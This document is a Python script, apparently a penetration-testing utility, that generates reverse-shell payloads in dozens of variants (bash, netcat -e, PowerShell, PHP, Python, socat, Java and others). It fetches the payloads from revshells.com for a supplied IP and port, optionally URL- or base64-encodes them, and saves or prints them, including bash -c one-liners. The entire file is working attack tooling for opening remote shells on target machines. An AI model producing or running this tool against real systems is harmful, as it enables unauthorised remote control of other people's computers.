import argparse
import base64
import urllib.parse
import requests
import os
import sys
from colorama import Fore, Style

BASE_URL = "https://www.revshells.com/"

SAVE_DIR = "reverse_shells"
os.makedirs(SAVE_DIR, exist_ok=True)

SERVICE_EXTENSIONS = {
    "bash": "sh", "sh": "sh", "zsh": "sh", "tcsh": "sh", "ash": "sh", "dash": "sh",
    "python": "py", "python3": "py",
    "php": "php",
    "powershell": "ps1",
    "ruby": "rb",
    "perl": "pl",
    "java": "java",
    "lua": "lua",
    "c": "c", "c#": "cs",
}

SERVICES = {
    "bash": {
        "bash -i": "Bash%20-i",
        "bash 196": "Bash%20196",
        "bash read line": "Bash%20read%20line",
        "bash 205": "Bash%205",
        "bash udp": "Bash%20udp"
    },
    "netcat": {
        "nc mkinfo": "nc%20mkfifo",
        "nc -e": "nc%20-e",
        "BusyBox nc -e": "BusyBox%20nc%20-e",
        "nc -c": "nc%20-c",
        "ncat -e": "ncat%20-e",
        "ncat udp": "ncat%20udp",
        "nc.exe -e": "nc.exe%20-e",
        "ncat.exe -e": "ncat.exe%20-e"
    },
    "windows_conpty": {
        "Windows ConPty": "Windows%20ConPty"
    },
    "powershell": {
        "PowerShell #1": "PowerShell%20%231",
        "PowerShell #2": "PowerShell%20%232",
        "PowerShell #3": "PowerShell%20%233",
        "PowerShell #4 TLS": "PowerShell%20%234%20(TLS)",
        "PowerShell #3 Base64": "PowerShell%20%233%20(Base64)"
    },
    "c": {
        "C": "C",
        "C# TCP Client": "C#%20TCP%20Client",
        "C# Bash -i": "C#%20Bash%20-i",
        "C Windows": "C%20Windows"
    },
    "misc": {
        "curl": "curl",
        "rustcat": "rustcat",
        "Haskell #1": "Haskell%20%231",
        "OpenSSL": "OpenSSL",
        "sqlite3 nc mkfifo": "sqlite3%20nc%20mkfifo",
        "telnet": "telnet",
        "zsh": "zsh",
        "Awk": "Awk",
        "Dart": "Dart",
        "Golang": "Golang",
        "Vlang": "Vlang"
    },
    "perl": {
        "Perl": "Perl",
        "Perl no sh": "Perl%20no%20sh",
        "Perl PentestMonkey": "Perl%20PentestMonkey"
    },
    "php": {
        "PHP PentestMonkey": "PHP%20PentestMonkey",
        "PHP Ivan Sincek": "PHP%20Ivan%20Sincek",
        "PHP cmd": "PHP%20cmd",
        "PHP cmd2": "PHP%20cmd%202",
        "PHP cmd small": "PHP%20cmd%20small",
        "PHP exec": "PHP%20exec",
        "PHP shell_exec": "PHP%20shell_exec",
        "PHP system": "PHP%20system",
        "PHP passthru": "PHP%20passthru",
        "PHP backticks": "PHP%20`", 
        "PHP popen": "PHP%20popen",
        "PHP proc_open": "PHP%20proc_open"
    },
    "python": {
        "Python #1": "Python%20%231",
        "Python #2": "Python%20%232",
        "Python3 #1": "Python3%20%231",
        "Python3 #2": "Python3%20%232",
        "Python3 shortest": "Python3%20shortest",
        "Python3 Windows": "Python3%20Windows"
    },
    "ruby": {
        "Ruby #1": "Ruby%20%231",
        "Ruby no sh": "Ruby%20no%20sh"
    },
    "socat": {
        "socat #1": "socat%20%231",
        "socat #2(TTY)": "socat%20%232%20(TTY)"
    },
    "node": {
        "node.js": "node.js",
        "node.js #2": "node.js%20%232",
        "Javascript": "Javascript"
    },
    "java": {
        "Java #1": "Java%20%231",
        "Java #2": "Java%20%232",
        "Java #3": "Java%20%233",
        "Java Web": "Java%20Web",
        "Java Two Way": "Java%20Two%20Way"
    },
    "lua": {
        "Lua #1": "Lua%20%231",
        "Lua #2": "Lua%20%232"
    },
    "crystal": {
        "Crystal (system)": "Crystal%20(system)",
        "Crystal (code)": "Crystal%20(code)"
    }
}

SHELL_TYPES = {
    "powershell": "powershell",
    "sh": "sh",
    "/bin/sh": "%2Fbin%2Fsh",
    "bash": "bash",
    "/bin/bash": "%2Fbin%2Fbash",
    "cmd": "cmd",
    "pwshell": "pwshell",
    "ash": "ash",
    "bsh": "bsh",
    "csh": "csh",
    "ksh": "ksh",
    "zsh": "zsh",
    "pdksh": "pdksh",
    "tcsh": "tcsh",
    "mksh": "mksh",
    "dash": "dash"
}

ENCODINGS = ["none", "url", "double_url", "base64"]


def write_file(filename, shell_payload):
    with open(filename, "w") as f:
        f.write(shell_payload + "\n")
    print(f"[{Fore.GREEN}+{Style.RESET_ALL}] Saved :  {Fore.MAGENTA} {filename}{Style.RESET_ALL}")


def additional_bash_shell(service, shell_payload, shell_name, encoding, stdout=None):
    add_payload = f"bash -c '{shell_payload}'"
    add_payload_name = f"bash -c '{shell_name}'"
    encoded_payload = encode_payload(add_payload, encoding)
    if stdout:
        print(f"{Fore.YELLOW}\n=== {add_payload_name} ({service}) ==={Style.RESET_ALL}\n{encoded_payload}\n")
        return

    filename = f"{SAVE_DIR}/{service}_bash_-c_{shell_name.replace(' ', '_')}.sh"

    write_file(filename, encoded_payload)
    return encoded_payload


def write_oneliner(payload):
    filename = f"{SAVE_DIR}/bash_oneliner.txt"
    if not payload:
        return
    write_file(filename, payload)


def get_file_extension(service_name):
    return SERVICE_EXTENSIONS.get(service_name, "txt")


def encode_payload(payload, encoding):
    if encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    return payload


def fetch_shell(shell_name, shell_url, ip, port, shell_type):
    query = f"{BASE_URL}{shell_url}?ip={ip}&port={port}&shell={shell_type}&encoding={shell_type}"
    response = requests.get(query)
    
    if response.status_code == 200:
        payload = response.text.strip()
        return payload
    else:
        print(f"[{Fore.RED}!{Style.RESET_ALL}] Failed:   {Fore.YELLOW}{shell_name}{Style.RESET_ALL}.")
        return None


def generate_shells(selected_service, ip, port, shell_type, encoding, generate_all, output):
    shells_to_generate = []
    oneliner_shells = ""

    if generate_all:
        for service_name, service_shells in SERVICES.items():
            for shell_name, shell_url in service_shells.items():
                shells_to_generate.append((service_name, shell_name, shell_url))
    else:
        if selected_service in SERVICES:
            for shell_name, shell_url in SERVICES[selected_service].items():
                shells_to_generate.append((selected_service, shell_name, shell_url))
        else:
            print(f"[{Fore.RED}!{Style.RESET_ALL}] Invalid service name: {Fore.RED} {selected_service}{Style.RESET_ALL}")
            sys.exit(1)

    for service, shell_name, shell_url in shells_to_generate:
        shell_payload = fetch_shell(shell_name, shell_url, ip, port, shell_type)
        if not shell_payload:
            continue
        encoded_payload = encode_payload(shell_payload, encoding)
        if shell_payload:
            if output == "stdout":
                print(f"{Fore.YELLOW}\n=== {shell_name} ({service}) ==={Style.RESET_ALL}\n{encoded_payload}\n")
                if service == "bash":
                    additional_bash_shell(service, shell_payload, shell_name, encoding, 1)
            else:
                file_ext = get_file_extension(service)
                filename = f"{SAVE_DIR}/{service}_{shell_name.replace(' ', '_')}.{file_ext}"
                write_file(filename, encoded_payload)
                if service == "bash":
                    oneliner_shells += encoded_payload + "\n"
                    oneliner_shells += additional_bash_shell(service, shell_payload, shell_name, encoding) + "\n"
    
    write_oneliner(oneliner_shells)
    

def main():
    parser = argparse.ArgumentParser(description="""
    Reverse shell generator.
    Based on https://www.revshells.com/""")

    service_group = parser.add_mutually_exclusive_group()
    service_group.add_argument("--service", choices=SERVICES.keys(), help="Specify which service to generate a shell for.")
    service_group.add_argument("--generate_all", action="store_true", help="Generate all available shells.")

    parser.add_argument("--ip", required=True, help="Target IP address.")
    parser.add_argument("--port", required=True, help="Target port.")
    parser.add_argument("--shell_type", choices=SHELL_TYPES.keys(), default="bash", help="Shell type (default: bash).")
    parser.add_argument("--encoding", choices=ENCODINGS, default="none", help="Encoding method (default: none).")
    parser.add_argument("--output", choices=["stdout", "files"], default="files", help="Output format (default: files).")

    args = parser.parse_args()

    generate_shells(
        selected_service=args.service,
        ip=args.ip,
        port=args.port,
        shell_type=SHELL_TYPES[args.shell_type],
        encoding=args.encoding,
        generate_all=args.generate_all,
        output=args.output
    )


if __name__ == "__main__":
    main()




